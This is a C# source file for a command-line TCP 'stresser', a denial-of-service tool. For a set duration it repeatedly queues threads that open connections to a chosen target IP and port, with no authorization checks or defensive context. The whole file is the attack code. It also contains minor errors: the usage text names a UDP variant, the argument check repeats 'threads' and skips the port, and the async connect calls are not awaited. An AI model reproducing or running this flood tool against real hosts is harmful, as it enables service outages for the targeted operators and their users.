#pragma warning disable CS8604
#pragma warning disable CS1998
#pragma warning disable CS4014

using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

namespace StresserTCP
{
    public class Program() {
        public static void Main(string[] args)
        {
            Console.Clear();
            string? target = null;
            string? threads = null;
            string? port = null;
            string? durationseconds = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--target" && i + 1 < args.Length)
                {
                    target = args[i + 1];
                }
                else if (args[i] == "--port" && i + 1 < args.Length)
                {
                    port = args[i + 1];
                }
                else if (args[i] == "--threads" && i + 1 < args.Length)
                {
                    threads = args[i + 1];
                }
                else if (args[i] == "--durationseconds" && i + 1 < args.Length)
                {
                    durationseconds = args[i + 1];
                }
            }
            if (string.IsNullOrWhiteSpace(target) || string.IsNullOrWhiteSpace(threads) || string.IsNullOrWhiteSpace(threads) || string.IsNullOrWhiteSpace(durationseconds))
            {
                Console.WriteLine("Usage: ./StresserUDP --target <192.168.0.1> --port <22> --threads <15> --durationseconds <60>");
                return;
            }
            Start(target, toInt(port), toInt(threads), toInt(durationseconds));
        }
        public static int toInt(string value)
        {
            return int.Parse(value);
        }
        public static async Task SendTCPWorker(string ipAddress, int port)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    client.ConnectAsync(IPAddress.Parse(ipAddress), port);
                }
            }
            catch (Exception)
            {

            }
        }

        public static void SendTCP(string ipAddress, int port, int threads)
        {
            if (threads <= 0)
            {
                throw new ArgumentOutOfRangeException(nameof(threads), "Thread count most be positive.");
            }

            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(delegate { SendTCPWorker(ipAddress, port); });
            }
        }

        public static void Start(string ipAddress, int port, int threads, int duration)
        {
            var stopwatch = Stopwatch.StartNew();
            while (stopwatch.Elapsed.TotalSeconds < duration)
            {
                try
                {
                    SendTCP(ipAddress, port, threads);
                }
                catch (Exception)
                {

                }
            }
            Environment.Exit(0x0);
        }
    }
}